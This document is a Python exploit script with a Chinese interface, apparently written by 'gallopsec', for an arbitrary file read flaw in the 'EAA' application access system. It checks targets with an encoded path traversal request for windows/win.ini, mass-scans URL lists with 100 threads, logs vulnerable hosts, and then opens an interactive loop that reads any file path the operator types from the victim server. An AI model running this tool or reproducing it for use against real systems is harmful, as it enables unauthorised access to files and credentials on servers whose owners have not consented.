#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#body="EAA益和应用接入系统"
def banner():
    test = """

        ███████╗     █████╗      █████╗ 
        ██╔════╝    ██╔══██╗    ██╔══██╗
        █████╗      ███████║    ███████║
        ██╔══╝      ██╔══██║    ██╔══██║
        ███████╗    ██║  ██║    ██║  ██║
        ╚══════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝                                                          
                            tag:  EAA 任意文件读取                                       
                            @author by gallopsec            
"""
    print(test)
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
def poc(target):
    url = target+"/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
    try:
        res = requests.get(url,headers=headers,timeout=5,verify=False).text
        if '[Mail]' in res:
            print(f"[+] {target} is vulable")
            with open("request.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False
def exp(target):
    print("等待连接...")
    time.sleep(2)
    os.system("cls")
    while True:
        cmd = input("请输入文件绝对路径(example:windows/win.ini,q--->quit)\n>>>")
        if cmd == "q":
            exit()
        url = target+f"/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/{cmd}"
        try:
            rep = requests.post(url,headers=headers,verify=False,timeout=5).text
            print(rep)
        except:
            print("执行异常,请重新执行其它命令")

def main():
    banner()
    parser = argparse.ArgumentParser(description='EAA 任意文件读取 EXP')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()